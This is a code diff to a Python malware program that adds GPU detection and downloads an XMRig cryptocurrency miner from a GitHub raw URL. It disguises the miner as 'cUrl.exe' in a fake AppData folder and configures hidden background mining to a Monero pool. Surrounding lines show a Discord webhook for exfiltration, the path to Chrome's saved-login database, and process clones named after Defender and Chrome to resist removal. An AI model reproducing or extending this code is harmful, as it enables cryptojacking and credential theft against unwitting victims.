@@ -13,6 +13,7 @@ import time
 import random
 import threading
 import re
+import wmi
 import json
 import uuid
 import textwrap
@@ -44,6 +45,8 @@ from datetime import timezone, datetime, timedelta
 import winreg as reg
 import getpass
 import os
+import zipfile
+
 USER_NAME = getpass.getuser()
 
 
@@ -55,7 +58,7 @@ USER_NAME = getpass.getuser()
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
 chiffre = "https://discord.com/api/webhooks/1010319375515013141/5QZfTr2qK5TtTQa-mRWYU1IqjZHwSzxoRXplFvDqCq4pn4w0eRISkCtC8V3SHF0iaQzu"
-ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
+ADDRESS = "XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
 CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
@@ -63,6 +66,24 @@ PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appd
 PROCESS_NUM = 2#3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
 
 MINE = True #Mine crypto? True/False
+MINING_PERCENT = "miningpercentEKIP"
+CUDA = False
+
+
+computer = wmi.WMI()
+
+GPUMODEL = computer.Win32_VideoController()[0]
+print()
+if("NVIDIA" in GPUMODEL.AdapterCompatibility):
+	MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrigcuda.zip?raw=true"
+	CUDA = True
+
+
+
+if CUDA == True:
+	XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\xmrig-nvidia.exe"
+else:
+	XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe"
 
 APP_DATA_PATH= os.environ['LOCALAPPDATA']
 DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
@@ -493,14 +514,14 @@ if yes == "yes":
 
 	def MineThreadWin():
 		print("[.] Starting miner if enabled.")
-		os.system(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe")
+		os.system(XMRIGPATH)
 
 	def MineThreadLinux():
 		print("[.] Starting miner if enabled.")
 		try:
-			os.system("./apt.bb -o rx.unmineable.com:3333 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k")
+			os.system("./apt.bb -o xmr-eu1.nanopool.org:14444 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k")
 		except:
-			os.system("./apt.bb -o rx.unmineable.com:3333 -u "+ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
+			os.system("./apt.bb -o xmr-eu1.nanopool.org:14444 -u "+ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
 	def connectOption():
 		if(os.name != "nt" and platform.system() != "Windows" or os.name != "windows" and platform.system() != "Windows"):
 			print("Not windows...")
@@ -526,9 +547,16 @@ if yes == "yes":
 				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
 				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
 				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
-				open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
+				if CUDA == True:
+					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\xmrig-nvidia.exe"
+					r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrigcuda.zip?raw=true")
+					with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'wb+') as f:
+						f.write(r.content)
+					with zipfile.ZipFile(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'r') as zip_ref:
+						zip_ref.extractall(os.getenv('APPDATA') + "\\winedows_companny\\update")
+					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\config.json", "x").write('''
 {
-    "algo": "cryptonight",
+    "coin": "monero",
     "api": {
         "port": 0,
         "access-token": null,
@@ -536,19 +564,13 @@ if yes == "yes":
         "ipv6": false,
         "restricted": true
     },
-    "av": 0,
     "background": true,
-    "colors": false,
-    "cpu-affinity": null,
-    "cpu-priority": null,
+    "colors": true,
     "donate-level": 5,
-    "huge-pages": true,
-    "hw-aes": null,
     "log-file": null,
-    "max-cpu-usage": 75,
     "pools": [
         {
-            "url": "rx.unmineable.com:3333",
+            "url": "xmr-eu1.nanopool.org:14444",
             "user": "''' + ADDRESS + '''",
             "pass": "x",
             "keepalive": true,
@@ -561,16 +583,60 @@ if yes == "yes":
     "print-time": 60,
     "retries": 5,
     "retry-pause": 5,
-    "safe": false,
     "syslog": false,
     "threads": null
 }
 
 
-				''')
-				r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/cUrl.exe?raw=true")
-				with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'wb+') as f:
-					f.write(r.content)
+
+					''')
+				else:
+					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe"
+					r = requests.get(MINERURL)
+					with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'wb+') as f:
+						f.write(r.content)
+					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
+	{
+	    "coin": "monero",
+	    "api": {
+	        "port": 0,
+	        "access-token": null,
+	        "worker-id": null,
+	        "ipv6": false,
+	        "restricted": true
+	    },
+	    "av": 0,
+	    "background": true,
+	    "colors": false,
+	    "cpu-affinity": null,
+	    "cpu-priority": null,
+	    "donate-level": 5,
+	    "huge-pages": true,
+	    "hw-aes": null,
+	    "log-file": null,
+	    "max-cpu-usage": ''' + MINING_PERCENT +''',
+	    "pools": [
+	        {
+	            "url": "xmr-eu1.nanopool.org:14444",
+	            "user": "''' + ADDRESS + '''",
+	            "pass": "x",
+	            "keepalive": true,
+	            "nicehash": false,
+	            "variant": -1,
+	            "tls": false,
+	            "tls-fingerprint": null
+	        }
+	    ],
+	    "print-time": 60,
+	    "retries": 5,
+	    "retry-pause": 5,
+	    "safe": false,
+	    "syslog": false,
+	    "threads": null
+	}
+
+
+					''')
 			except Exception as e:
 				print(e)
 			if MINE == True:
